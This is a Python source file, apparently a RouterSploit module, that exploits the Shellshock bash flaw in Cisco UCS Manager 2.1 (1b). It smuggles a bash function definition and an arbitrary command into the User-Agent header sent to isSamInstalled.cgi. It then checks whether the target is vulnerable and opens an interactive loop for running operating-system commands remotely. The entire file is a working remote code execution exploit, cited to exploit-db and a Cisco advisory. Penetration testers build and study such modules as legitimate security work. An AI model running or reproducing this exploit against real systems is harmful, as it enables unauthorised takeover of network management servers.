import re

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Cisco UCS Manager RCE',
        'description': 'Module exploits Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability which '
                       'allows executing commands on operating system level.',
        'authors': [
            'thatchriseckert',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39568/',
            'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash',
        ],
        'devices': [
            'Cisco UCS Manager 2.1 (1b)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        mark = random_text(32)
        url = "{}:{}/ucsm/isSamInstalled.cgi".format(self.target, self.port)
        headers = {
            "User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo %s; echo "$(%s)"; echo %s;' % (mark, cmd, mark)
        }

        response = http_request(method="GET", url=url, headers=headers)
        if response is None:
            return ""

        if mark in response.text:
            regexp = "%s(|.+?)%s" % (mark, mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True

        return False
